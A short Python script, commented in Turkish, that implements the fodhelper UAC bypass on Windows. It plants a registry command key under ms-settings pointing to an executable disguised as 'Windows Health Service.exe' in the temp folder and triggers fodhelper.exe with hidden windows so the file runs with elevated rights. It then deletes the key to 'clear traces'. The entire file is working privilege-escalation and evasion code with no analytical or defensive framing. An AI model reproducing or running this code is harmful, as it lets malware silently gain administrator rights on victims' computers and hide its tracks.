import os
import winreg
import subprocess
import time
import sys

def is_process_running(process_name):
    try:
        # Tasklist çıktısını alırken pencere açılmasını engelle
        output = subprocess.check_output(
            f'tasklist /FI "IMAGENAME eq {process_name}"', 
            shell=True, 
            creationflags=subprocess.CREATE_NO_WINDOW
        ).decode(errors='ignore')
        return process_name.lower() in output.lower()
    except:
        return False

def bypass_uac_and_run(exe_path):
    target_name = "Windows Health Service.exe"
    
    # Eğer zaten çalışıyorsa sessizce çık
    if is_process_running(target_name):
        sys.exit()

    reg_path = r'Software\Classes\ms-settings\shell\open\command'
    
    # %temp% yolunu güvenli şekilde çöz
    temp_folder = os.environ.get('TEMP')
    full_path = os.path.join(temp_folder, "Windows Health Service.exe")

    if not os.path.exists(full_path):
        sys.exit()

    try:
        # Kayıt defteri işlemlerini sessizce yap
        winreg.CreateKey(winreg.HKEY_CURRENT_USER, reg_path)
        with winreg.OpenKey(winreg.HKEY_CURRENT_USER, reg_path, 0, winreg.KEY_WRITE) as key:
            winreg.SetValueEx(key, "", 0, winreg.REG_SZ, full_path)
            winreg.SetValueEx(key, "DelegateExecute", 0, winreg.REG_SZ, "")
        
        # fodhelper'ı hiçbir pencere açmadan tetikle
        subprocess.run(
            "fodhelper.exe", 
            shell=True, 
            creationflags=subprocess.CREATE_NO_WINDOW
        )
        
        # Sistemin işlemesi için bekle
        time.sleep(3)

        # İzleri temizle
        winreg.DeleteKey(winreg.HKEY_CURRENT_USER, reg_path)

    except:
        pass

if __name__ == "__main__":
    target_exe = "Windows Health Service.exe"
    bypass_uac_and_run(target_exe)
